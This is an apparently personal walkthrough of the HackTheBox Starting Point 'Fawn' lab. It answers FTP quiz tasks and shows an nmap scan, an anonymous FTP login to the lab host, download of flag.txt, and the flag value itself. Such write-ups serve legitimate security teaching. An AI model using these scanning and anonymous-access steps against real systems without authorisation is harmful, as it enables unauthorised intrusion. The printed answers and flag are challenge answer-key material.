# HackTheBox - Starting Point: Fawn Write-up

## Introduction

This write-up covers the steps taken to solve the Fawn machine on HackTheBox's Starting Point. The goal is to gain root access to the machine and retrieve the flags. This guide is intended for educational purposes and to help others understand the methodology used in CTF challenges.

## Walktrough :

- **Task 1:** What does the 3-letter acronym FTP stand for? 
    > Answer :  File Transfer Protocol 

- **Task 2:**  Which port does the FTP service listen on usually? 
    > Answer :  21

- **Task 3:** FTP sends data in the clear, without any encryption. What acronym is used for a later protocol designed to provide similar functionality to FTP but securely, as an extension of the SSH protocol?

    <small> [How SFTP work](https://www.thruinc.com/blog/sftp-basics/) </small>
    > Answer : SFTP 

- **Task 4:**  What is the command we can use to send an ICMP echo request to test our connection to the target? 
    > Answer : ping

    To answer the task 5 question we need to perform a port scan with nmap : 

    ```bash
    $ nmap 10.129.26.80
    Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-29 10:44 CET
        Nmap scan report for 10.129.26.80
        Host is up (0.029s latency).
        Not shown: 999 closed tcp ports (conn-refused)
        PORT   STATE SERVICE VERSION
        21/tcp open  ftp     vsftpd 3.0.3
        | ftp-syst: 
        |   STAT: 
        | FTP server status:
        |      Connected to ::ffff:10.10.14.189
        |      Logged in as ftp
        |      TYPE: ASCII
        |      No session bandwidth limit
        |      Session timeout in seconds is 300
        |      Control connection is plain text
        |      Data connections will be plain text
        |      At session startup, client count was 3
        |      vsFTPd 3.0.3 - secure, fast, stable
        |_End of status
        | ftp-anon: Anonymous FTP login allowed (FTP code 230)
        |_-rw-r--r--    1 0        0              32 Jun 04  2021 flag.txt
        Service Info: OS: Unix
    ```

- **Task 5:**   From your scans, what version is FTP running on the target? 
    > Answer : vsftpd 3.0.3

- **Task 6:** From your scans, what OS type is running on the target? 
    > Answer : Unix

- **Task 7:**  What is the command we need to run in order to display the 'ftp' client help menu? 
    > Answer : ftp -?

- **Task 8:**   What is username that is used over FTP when you want to log in without having an account? 
    > Answer : anonymous

- **Task 9:**  What is the response code we get for the FTP message 'Login successful'? 
    > Answer : 230

- **Task 10:**  There are a couple of commands we can use to list the files and directories available on the FTP server. One is dir. What is the other that is a common way to list files on a Linux system. 
    > Answer : ls

- **Task 11:**   What is the command used to download the file we found on the FTP server?  
    > Answer : get


To get the flag, we need to connect to the FTP server on the target machine. After logging in as anonymous with a blank password, we can see that a `flag.txt` file is stored in the main directory.

```bash
$ ftp 10.129.26.80
Connected to 10.129.26.80.
220 (vsFTPd 3.0.3)
Name (10.129.26.80:yannis): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.

ftp> ls
229 Entering Extended Passive Mode (|||8606|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0              32 Jun 04  2021 flag.txt
226 Directory send OK.

ftp> get flag.txt
local: flag.txt remote: flag.txt
229 Entering Extended Passive Mode (|||33773|)
150 Opening BINARY mode data connection for flag.txt (32 bytes).
100% |**************************************************************************|   32       31.88 KiB/s    00:00 ETA
226 Transfer complete.
```

Then, we can run a `cat` command to see the flag.txt file content on our local machine : 
```bash
$ cat flag.txt 
035db21c881520061c53e0536e44f815
```
- **Submit root flag:** : 
    > 035db21c881520061c53e0536e44f815


